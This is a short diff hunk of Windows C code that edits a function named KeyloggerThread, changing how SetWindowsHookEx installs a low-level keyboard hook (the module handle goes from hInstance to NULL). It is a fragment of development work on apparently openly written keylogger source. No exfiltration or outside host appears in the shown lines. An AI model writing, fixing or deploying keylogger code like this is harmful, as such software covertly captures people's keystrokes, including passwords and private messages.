@@ -65,7 +65,7 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
     hKeyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
         KeyboardProc,
-        hInstance,
+        NULL,
         0
     );
     
